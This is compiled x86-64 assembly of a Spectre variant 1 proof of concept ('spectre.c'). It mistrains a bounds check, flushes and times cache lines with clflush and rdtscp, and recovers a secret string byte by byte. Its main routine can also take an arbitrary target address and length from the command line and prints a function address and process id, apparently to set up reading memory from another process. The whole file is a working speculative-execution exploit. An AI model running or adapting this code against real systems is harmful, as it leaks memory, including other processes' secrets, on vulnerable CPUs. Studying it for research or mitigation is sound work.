	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	mov	qword ptr [rbp - 16], rdi
	cmp	qword ptr [rbp - 16], 16
	jae	.LBB0_2
# %bb.1:
	mov	dword ptr [rbp - 4], 1
	jmp	.LBB0_3
.LBB0_2:
	mov	dword ptr [rbp - 4], 0
.LBB0_3:
	mov	eax, dword ptr [rbp - 4]
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	mov	qword ptr [rbp - 8], rdi
	mov	qword ptr [rbp - 16], rsi
	mov	rax, qword ptr [rbp - 16]
	cmp	dword ptr [rax], 0
	je	.LBB1_2
# %bb.1:
	mov	rax, qword ptr [rbp - 8]
	movzx	ecx, byte ptr [rax + array1]
	shl	ecx, 9
	movsxd	rax, ecx
	movzx	ecx, byte ptr [rax + array2]
	movzx	edx, byte ptr [temp]
	and	edx, ecx
                                        # kill: def $dl killed $dl killed $edx
	mov	byte ptr [temp], dl
.LBB1_2:
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	sub	rsp, 144
	mov	qword ptr [rbp - 24], rdi
	mov	qword ptr [rbp - 32], rsi
	mov	qword ptr [rbp - 40], rdx
	mov	dword ptr [rbp - 64], 0
	mov	dword ptr [rbp - 48], 0
.LBB2_1:                                # =>This Inner Loop Header: Depth=1
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB2_4
# %bb.2:                                #   in Loop: Header=BB2_1 Depth=1
	movsxd	rax, dword ptr [rbp - 48]
	mov	dword ptr [4*rax + readMemoryByte.results], 0
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB2_1
.LBB2_4:
	mov	dword ptr [rbp - 44], 999
.LBB2_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #     Child Loop BB2_18 Depth 2
                                        #     Child Loop BB2_25 Depth 2
	cmp	dword ptr [rbp - 44], 0
	jle	.LBB2_41
# %bb.6:                                #   in Loop: Header=BB2_5 Depth=1
	mov	dword ptr [rbp - 48], 0
.LBB2_7:                                #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movabs	rax, offset array2
	mov	ecx, dword ptr [rbp - 48]
	shl	ecx, 9
	movsxd	rdx, ecx
	add	rax, rdx
	clflush	byte ptr [rax]
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB2_7
.LBB2_10:                               #   in Loop: Header=BB2_5 Depth=1
	mov	eax, dword ptr [rbp - 44]
	cdq
	mov	ecx, 16
	idiv	ecx
	movsxd	rsi, edx
	mov	qword ptr [rbp - 72], rsi
	mov	dword ptr [rbp - 52], 29
.LBB2_11:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 52], 0
	jl	.LBB2_17
# %bb.12:                               #   in Loop: Header=BB2_11 Depth=2
	mov	eax, dword ptr [rbp - 52]
	cdq
	mov	ecx, 6
	idiv	ecx
	cmp	edx, 0
	jne	.LBB2_14
# %bb.13:                               #   in Loop: Header=BB2_11 Depth=2
	mov	dword ptr [x_is_safe_static], 1
	jmp	.LBB2_15
.LBB2_14:                               #   in Loop: Header=BB2_11 Depth=2
	mov	dword ptr [x_is_safe_static], 0
.LBB2_15:                               #   in Loop: Header=BB2_11 Depth=2
	movabs	rax, offset x_is_safe_static
	mov	qword ptr [rbp - 112], rax
	#APP
	mfence

	#NO_APP
	mov	rax, qword ptr [rbp - 112]
	clflush	byte ptr [rax]
	#APP
	mfence

	#NO_APP
	mov	eax, dword ptr [rbp - 52]
	cdq
	mov	ecx, 6
	idiv	ecx
	sub	edx, 1
	and	edx, -65536
	movsxd	rsi, edx
	mov	qword ptr [rbp - 80], rsi
	mov	rsi, qword ptr [rbp - 80]
	mov	rdi, qword ptr [rbp - 80]
	shr	rdi, 16
	or	rsi, rdi
	mov	qword ptr [rbp - 80], rsi
	mov	rsi, qword ptr [rbp - 72]
	mov	rdi, qword ptr [rbp - 80]
	mov	r8, qword ptr [rbp - 24]
	xor	r8, qword ptr [rbp - 72]
	and	rdi, r8
	xor	rsi, rdi
	mov	qword ptr [rbp - 80], rsi
	mov	rdi, qword ptr [rbp - 80]
	mov	rsi, qword ptr [rbp - 112]
	call	victim_function
	mov	dword ptr [x_is_safe_static], 16
# %bb.16:                               #   in Loop: Header=BB2_11 Depth=2
	mov	eax, dword ptr [rbp - 52]
	add	eax, -1
	mov	dword ptr [rbp - 52], eax
	jmp	.LBB2_11
.LBB2_17:                               #   in Loop: Header=BB2_5 Depth=1
	mov	dword ptr [rbp - 48], 0
.LBB2_18:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB2_24
# %bb.19:                               #   in Loop: Header=BB2_18 Depth=2
	movabs	rax, offset array2
	imul	ecx, dword ptr [rbp - 48], 167
	add	ecx, 13
	and	ecx, 255
	mov	dword ptr [rbp - 60], ecx
	mov	ecx, dword ptr [rbp - 60]
	shl	ecx, 9
	movsxd	rdx, ecx
	add	rax, rdx
	mov	qword ptr [rbp - 104], rax
	lea	rax, [rbp - 64]
	mov	qword ptr [rbp - 16], rax
	mov	rdx, qword ptr [rbp - 16]
	mov	qword ptr [rbp - 120], rax      # 8-byte Spill
	mov	qword ptr [rbp - 128], rdx      # 8-byte Spill
	rdtscp
	shl	rdx, 32
	or	rax, rdx
	mov	rdx, qword ptr [rbp - 128]      # 8-byte Reload
	mov	dword ptr [rdx], ecx
	mov	qword ptr [rbp - 88], rax
	mov	rax, qword ptr [rbp - 104]
	mov	sil, byte ptr [rax]
	movzx	ecx, sil
	mov	dword ptr [rbp - 64], ecx
	mov	rax, qword ptr [rbp - 120]      # 8-byte Reload
	mov	qword ptr [rbp - 8], rax
	mov	rdi, qword ptr [rbp - 8]
	rdtscp
	shl	rdx, 32
	or	rax, rdx
	mov	dword ptr [rdi], ecx
	sub	rax, qword ptr [rbp - 88]
	mov	qword ptr [rbp - 96], rax
	cmp	qword ptr [rbp - 96], 100
	ja	.LBB2_22
# %bb.20:                               #   in Loop: Header=BB2_18 Depth=2
	mov	eax, dword ptr [rbp - 60]
	mov	ecx, dword ptr [rbp - 44]
	mov	dword ptr [rbp - 132], eax      # 4-byte Spill
	mov	eax, ecx
	cdq
	mov	ecx, 16
	idiv	ecx
	movsxd	rsi, edx
	movzx	ecx, byte ptr [rsi + array1]
	mov	edx, dword ptr [rbp - 132]      # 4-byte Reload
	cmp	edx, ecx
	je	.LBB2_22
# %bb.21:                               #   in Loop: Header=BB2_18 Depth=2
	movsxd	rax, dword ptr [rbp - 60]
	mov	ecx, dword ptr [4*rax + readMemoryByte.results]
	add	ecx, 1
	mov	dword ptr [4*rax + readMemoryByte.results], ecx
.LBB2_22:                               #   in Loop: Header=BB2_18 Depth=2
	jmp	.LBB2_23
.LBB2_23:                               #   in Loop: Header=BB2_18 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB2_18
.LBB2_24:                               #   in Loop: Header=BB2_5 Depth=1
	mov	dword ptr [rbp - 56], -1
	mov	dword ptr [rbp - 52], -1
	mov	dword ptr [rbp - 48], 0
.LBB2_25:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB2_35
# %bb.26:                               #   in Loop: Header=BB2_25 Depth=2
	cmp	dword ptr [rbp - 52], 0
	jl	.LBB2_28
# %bb.27:                               #   in Loop: Header=BB2_25 Depth=2
	movsxd	rax, dword ptr [rbp - 48]
	mov	ecx, dword ptr [4*rax + readMemoryByte.results]
	movsxd	rax, dword ptr [rbp - 52]
	cmp	ecx, dword ptr [4*rax + readMemoryByte.results]
	jl	.LBB2_29
.LBB2_28:                               #   in Loop: Header=BB2_25 Depth=2
	mov	eax, dword ptr [rbp - 52]
	mov	dword ptr [rbp - 56], eax
	mov	eax, dword ptr [rbp - 48]
	mov	dword ptr [rbp - 52], eax
	jmp	.LBB2_33
.LBB2_29:                               #   in Loop: Header=BB2_25 Depth=2
	cmp	dword ptr [rbp - 56], 0
	jl	.LBB2_31
# %bb.30:                               #   in Loop: Header=BB2_25 Depth=2
	movsxd	rax, dword ptr [rbp - 48]
	mov	ecx, dword ptr [4*rax + readMemoryByte.results]
	movsxd	rax, dword ptr [rbp - 56]
	cmp	ecx, dword ptr [4*rax + readMemoryByte.results]
	jl	.LBB2_32
.LBB2_31:                               #   in Loop: Header=BB2_25 Depth=2
	mov	eax, dword ptr [rbp - 48]
	mov	dword ptr [rbp - 56], eax
.LBB2_32:                               #   in Loop: Header=BB2_25 Depth=2
	jmp	.LBB2_33
.LBB2_33:                               #   in Loop: Header=BB2_25 Depth=2
	jmp	.LBB2_34
.LBB2_34:                               #   in Loop: Header=BB2_25 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB2_25
.LBB2_35:                               #   in Loop: Header=BB2_5 Depth=1
	movsxd	rax, dword ptr [rbp - 52]
	mov	ecx, dword ptr [4*rax + readMemoryByte.results]
	movsxd	rax, dword ptr [rbp - 56]
	mov	edx, dword ptr [4*rax + readMemoryByte.results]
	shl	edx, 1
	add	edx, 5
	cmp	ecx, edx
	jge	.LBB2_38
# %bb.36:                               #   in Loop: Header=BB2_5 Depth=1
	movsxd	rax, dword ptr [rbp - 52]
	cmp	dword ptr [4*rax + readMemoryByte.results], 2
	jne	.LBB2_39
# %bb.37:                               #   in Loop: Header=BB2_5 Depth=1
	movsxd	rax, dword ptr [rbp - 56]
	cmp	dword ptr [4*rax + readMemoryByte.results], 0
	jne	.LBB2_39
.LBB2_38:
	jmp	.LBB2_41
.LBB2_39:                               #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_40
.LBB2_40:                               #   in Loop: Header=BB2_5 Depth=1
	mov	eax, dword ptr [rbp - 44]
	add	eax, -1
	mov	dword ptr [rbp - 44], eax
	jmp	.LBB2_5
.LBB2_41:
	mov	eax, dword ptr [rbp - 64]
	xor	eax, dword ptr [readMemoryByte.results]
	mov	dword ptr [readMemoryByte.results], eax
	mov	eax, dword ptr [rbp - 52]
                                        # kill: def $al killed $al killed $eax
	mov	rcx, qword ptr [rbp - 32]
	mov	byte ptr [rcx], al
	movsxd	rcx, dword ptr [rbp - 52]
	mov	edx, dword ptr [4*rcx + readMemoryByte.results]
	mov	rcx, qword ptr [rbp - 40]
	mov	dword ptr [rcx], edx
	mov	edx, dword ptr [rbp - 56]
                                        # kill: def $dl killed $dl killed $edx
	mov	rcx, qword ptr [rbp - 32]
	mov	byte ptr [rcx + 1], dl
	movsxd	rcx, dword ptr [rbp - 56]
	mov	esi, dword ptr [4*rcx + readMemoryByte.results]
	mov	rcx, qword ptr [rbp - 40]
	mov	dword ptr [rcx + 4], esi
	add	rsp, 144
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	sub	rsp, 96
	mov	dword ptr [rbp - 4], 0
	mov	dword ptr [rbp - 8], edi
	mov	qword ptr [rbp - 16], rsi
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
	call	getchar
                                        # kill: def $al killed $al killed $eax
	mov	byte ptr [rbp - 17], al
	movsx	ecx, byte ptr [rbp - 17]
	cmp	ecx, 114
	jne	.LBB3_22
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rsi, qword ptr [secret]
	mov	rdx, qword ptr [secret]
	movabs	rdi, offset .L.str.1
	mov	al, 0
	call	printf
	mov	rcx, qword ptr [secret]
	movabs	rdx, offset array1
	sub	rcx, rdx
	mov	qword ptr [rbp - 32], rcx
	mov	rdi, qword ptr [secret]
	mov	dword ptr [rbp - 64], eax       # 4-byte Spill
	call	strlen
                                        # kill: def $eax killed $eax killed $rax
	mov	dword ptr [rbp - 44], eax
	mov	qword ptr [rbp - 56], 0
.LBB3_3:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	qword ptr [rbp - 56], 131072
	jae	.LBB3_6
# %bb.4:                                #   in Loop: Header=BB3_3 Depth=2
	mov	rax, qword ptr [rbp - 56]
	mov	byte ptr [rax + array2], 1
# %bb.5:                                #   in Loop: Header=BB3_3 Depth=2
	mov	rax, qword ptr [rbp - 56]
	add	rax, 1
	mov	qword ptr [rbp - 56], rax
	jmp	.LBB3_3
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	dword ptr [rbp - 8], 3
	jne	.LBB3_8
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	mov	rax, qword ptr [rbp - 16]
	mov	rdi, qword ptr [rax + 8]
	lea	rax, [rbp - 32]
	movabs	rsi, offset .L.str.2
	mov	rdx, rax
	mov	al, 0
	call	__isoc99_sscanf
	mov	rcx, qword ptr [rbp - 32]
	movabs	rdx, offset array1
	sub	rcx, rdx
	mov	qword ptr [rbp - 32], rcx
	mov	rcx, qword ptr [rbp - 16]
	mov	rdi, qword ptr [rcx + 16]
	movabs	rsi, offset .L.str.3
	lea	rdx, [rbp - 44]
	mov	dword ptr [rbp - 68], eax       # 4-byte Spill
	mov	al, 0
	call	__isoc99_sscanf
	mov	rsi, qword ptr [rbp - 32]
	mov	edx, dword ptr [rbp - 44]
	movabs	rdi, offset .L.str.4
	mov	dword ptr [rbp - 72], eax       # 4-byte Spill
	mov	al, 0
	call	printf
.LBB3_8:                                #   in Loop: Header=BB3_1 Depth=1
	mov	esi, dword ptr [rbp - 44]
	movabs	rdi, offset .L.str.5
	mov	al, 0
	call	printf
	mov	dword ptr [rbp - 60], 0
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, dword ptr [rbp - 44]
	add	eax, -1
	mov	dword ptr [rbp - 44], eax
	cmp	eax, 0
	jl	.LBB3_21
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=2
	mov	rsi, qword ptr [rbp - 32]
	mov	rax, qword ptr [secret]
	movsxd	rcx, dword ptr [rbp - 60]
	movsx	edx, byte ptr [rax + rcx]
	movabs	rdi, offset .L.str.6
	mov	al, 0
	call	printf
	lea	rdx, [rbp - 40]
	lea	rsi, [rbp - 46]
	mov	r8d, dword ptr [rbp - 60]
	add	r8d, 1
	mov	dword ptr [rbp - 60], r8d
	mov	rcx, qword ptr [rbp - 32]
	mov	rdi, rcx
	add	rdi, 1
	mov	qword ptr [rbp - 32], rdi
	mov	rdi, rcx
	mov	dword ptr [rbp - 76], eax       # 4-byte Spill
	call	readMemoryByte
	mov	eax, dword ptr [rbp - 40]
	mov	r8d, dword ptr [rbp - 36]
	shl	r8d, 1
	cmp	eax, r8d
	movabs	rcx, offset .L.str.8
	movabs	rdx, offset .L.str.9
	cmovge	rdx, rcx
	movabs	rdi, offset .L.str.7
	mov	rsi, rdx
	mov	al, 0
	call	printf
	movzx	esi, byte ptr [rbp - 46]
	movzx	r8d, byte ptr [rbp - 46]
	cmp	r8d, 31
	mov	dword ptr [rbp - 80], esi       # 4-byte Spill
	jle	.LBB3_13
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=2
	movzx	eax, byte ptr [rbp - 46]
	cmp	eax, 127
	jge	.LBB3_13
# %bb.12:                               #   in Loop: Header=BB3_9 Depth=2
	movzx	eax, byte ptr [rbp - 46]
	mov	dword ptr [rbp - 84], eax       # 4-byte Spill
	jmp	.LBB3_14
.LBB3_13:                               #   in Loop: Header=BB3_9 Depth=2
	mov	eax, 63
	mov	dword ptr [rbp - 84], eax       # 4-byte Spill
	jmp	.LBB3_14
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=2
	mov	eax, dword ptr [rbp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [rbp - 40]
	movabs	rdi, offset .L.str.10
	mov	esi, dword ptr [rbp - 80]       # 4-byte Reload
	mov	edx, eax
	mov	al, 0
	call	printf
	cmp	dword ptr [rbp - 36], 0
	jle	.LBB3_20
# %bb.15:                               #   in Loop: Header=BB3_9 Depth=2
	movzx	esi, byte ptr [rbp - 45]
	movzx	eax, byte ptr [rbp - 45]
	cmp	eax, 31
	mov	dword ptr [rbp - 88], esi       # 4-byte Spill
	jle	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_9 Depth=2
	movzx	eax, byte ptr [rbp - 45]
	cmp	eax, 127
	jge	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_9 Depth=2
	movzx	eax, byte ptr [rbp - 45]
	mov	dword ptr [rbp - 92], eax       # 4-byte Spill
	jmp	.LBB3_19
.LBB3_18:                               #   in Loop: Header=BB3_9 Depth=2
	mov	eax, 63
	mov	dword ptr [rbp - 92], eax       # 4-byte Spill
	jmp	.LBB3_19
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=2
	mov	eax, dword ptr [rbp - 92]       # 4-byte Reload
	mov	ecx, dword ptr [rbp - 36]
	movabs	rdi, offset .L.str.11
	mov	esi, dword ptr [rbp - 88]       # 4-byte Reload
	mov	edx, eax
	mov	al, 0
	call	printf
.LBB3_20:                               #   in Loop: Header=BB3_9 Depth=2
	movabs	rdi, offset .L.str.12
	mov	al, 0
	call	printf
	jmp	.LBB3_9
.LBB3_21:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_22:                               #   in Loop: Header=BB3_1 Depth=1
	movsx	eax, byte ptr [rbp - 17]
	cmp	eax, 10
	jne	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_24:                               #   in Loop: Header=BB3_1 Depth=1
	movsx	eax, byte ptr [rbp - 17]
	cmp	eax, 105
	jne	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_1 Depth=1
	mov	al, 0
	call	getpid
	movabs	rcx, offset check
	add	rcx, 33
	movabs	rdi, offset .L.str.13
	mov	rsi, rcx
	mov	edx, eax
	mov	al, 0
	call	printf
	jmp	.LBB3_27
.LBB3_26:
	jmp	.LBB3_30
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_28
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_29:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_30:
	xor	eax, eax
	add	rsp, 96
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	x_is_safe_static,@object        # @x_is_safe_static
	.data
	.globl	x_is_safe_static
	.p2align	2
x_is_safe_static:
	.long	16                              # 0x10
	.size	x_is_safe_static, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131056
	.size	array2, 131072

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.12,@object               # @.str.12
.L.str.12:
	.asciz	"\n"
	.size	.L.str.12, 2

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.type	unused3,@object                 # @unused3
	.globl	unused3
	.p2align	4
unused3:
	.zero	64
	.size	unused3, 64

	.ident	"Ubuntu clang version 11.1.0-6"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym x_is_safe_static
	.addrsig_sym array1
	.addrsig_sym array2
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym readMemoryByte.results
